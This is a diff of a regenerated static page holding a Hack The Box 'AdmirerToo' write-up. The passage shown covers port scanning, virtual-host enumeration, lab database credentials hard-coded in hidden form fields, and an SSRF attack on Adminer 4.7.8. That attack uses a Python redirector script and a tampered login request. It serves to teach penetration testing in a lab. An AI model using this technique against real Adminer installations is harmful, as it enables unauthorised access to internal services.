@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769393205067">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.819170984352">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>AdmirerToo</title>
@@ -30,52 +30,52 @@
     <meta property="twitter:description" content="IP: 10.10.11.137">
     <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/admirertoo/images/admirer.png">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.5.0.769393205067" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.819170984352" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.769393205067" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.819170984352" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
-                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">ctf-notes</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
-                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                         </g>
                                     </svg>
                                     <span>GitHub</span>
                                 </a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
                                             <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -96,7 +96,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -114,7 +114,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -124,26 +124,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
-                <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -153,23 +153,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
-                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                 </g>
                                             </svg>
                                             <span>GitHub</span>
                                         </a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
                                                     <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -183,7 +183,7 @@
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -191,14 +191,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="admirertoo" class="break-words">
     <h1>
@@ -207,7 +207,7 @@
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/admirer.png" alt="">
+    <img src="images/admirer.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -225,7 +225,7 @@
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.137
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.137
 
 PORT      STATE    SERVICE
 22/tcp    open     ssh
@@ -241,7 +241,7 @@ PORT      STATE    SERVICE
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sudo nmap -sC -sV -p 22,80 10.10.11.137
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo nmap -sC -sV -p 22,80 10.10.11.137
 
 Nmap 7.92 scan initiated Thu Mar 24 14:17:01 2022 as: nmap -sC -sV -p 22,80 -o nmap 10.10.11.137
 Nmap scan report for 10.10.11.137
@@ -266,7 +266,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 </doc-anchor-target>
 <p>Looking at the webpage on port 80 we can see an email and domain when we make a request to a non existent page:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.137/test                               
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.137/test                               
 &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
 &lt;html&gt;&lt;head&gt;
 &lt;title&gt;404 Not Found&lt;/title&gt;
@@ -286,7 +286,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 </doc-anchor-target>
 <p>Lets check if there is any other subdomains:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gobuster vhost -u http://admirer-gallery.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ gobuster vhost -u http://admirer-gallery.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
 ===============================================================
 Gobuster v3.1.0
@@ -312,13 +312,13 @@ Found: db.admirer-gallery.htb (Status: 200) [Size: 2568]</code></pre>
 </doc-anchor-target>
 <p>Accessing <a href="http://db.admirer-gallery.htb">http://db.admirer-gallery.htb</a> we get the Adminer v4.7.8 portal:
 <figure class="content-center">
-    <img src="images/image1.png" alt="">
+    <img src="images/image1.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 We have access to database via web. Let’s enter and look for any interesting tables. just hit enter, and we are in.
 There’s only one table and nothing really interesting in that. The reason why it didn’t ask for any credentials is that the credentials are hard-coded in the page and POST them once we click on &quot;enter&quot; button&quot;</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-markup"><code v-pre class="language-markup">&lt;input type=&quot;hidden&quot; name=&quot;auth[driver]&quot; value=&quot;server&quot;&gt;  
+<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;input type=&quot;hidden&quot; name=&quot;auth[driver]&quot; value=&quot;server&quot;&gt;  
 &lt;input type=&quot;hidden&quot; name=&quot;auth[server]&quot; value=&quot;localhost&quot;&gt;  
 &lt;input type=&quot;hidden&quot; name=&quot;auth[username]&quot; value=&quot;admirer_ro&quot;&gt;  
 &lt;input type=&quot;hidden&quot; name=&quot;auth[password]&quot; value=&quot;1w4nn4b3adm1r3d2!&quot;&gt;  
@@ -336,7 +336,7 @@ Basically is a Server-Side Request Forgery to access an internal server/service.
 There’s a <a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">POC</a> already available for this. We just need to setup a redirector on our Kali Linux machine.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">redirector.py</div>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3  
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3  
 #python3 ./redirector.py 8000 http://127.0.0.1/  
 import sys  
 from http.server import HTTPServer, BaseHTTPRequestHandler  
@@ -355,12 +355,12 @@ HTTPServer((&quot;&quot;, int(sys.argv[1])), Redirect).serve_forever()</code></p
 </doc-codeblock></div>
 <p>Start the redirector script:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 http://127.0.0.1</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 http://127.0.0.1</code></pre>
 </doc-codeblock></div>
 <p>For this to work, we need to capture the request of logging into the DB in Burp Suite. Make sure not to send this to repeater.</p>
 <p>Analyse the login POST request:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">POST /?server=localhost HTTP/1.1
+<pre translate="no" class="language-none"><code v-pre class="language-none">POST /?server=localhost HTTP/1.1
 Host: db.admirer-gallery.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -378,73 +378,73 @@ auth%5Bdriver%5D=server&amp;auth%5Bserver%5D=localhost&amp;auth%5Busername%5D=ad
 </doc-codeblock></div>
 <p>This is a default request. If we change <code v-pre>Auth Server</code> value from <code v-pre>localhost</code> to our <code v-pre>Kali IP address</code> and forward the request to server, then we’d get this error:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Connection refused</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Connection refused</code></pre>
 </doc-codeblock></div>
 <p>So, we need to edit <code v-pre>Auth Driver</code> value and <code v-pre>Auth Server</code> value. According to POC PDF, we need to modify auth drive value to <code v-pre>elasticsearch</code> and auth server value as our attacking machine’s IP address (Kali Linux).
 After changing the both values, I couldn’t get a hit on our python script. Then I looked into the source of <code v-pre>Adminer</code> at <a href="https://github.com/vrana/adminer/tree/master/adminer/drivers">https://github.com/vrana/adminer/tree/master/adminer/drivers</a>:</p>
 <p>As you can see the source code, the driver name is just <code v-pre>elastic</code> not <code v-pre>elasticsearch</code>. This is the reason it didn’t work. Let’s change both values one more time.
 <figure class="content-center">
-    <img src="images/image2.png" alt="">
+    <img src="images/image2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
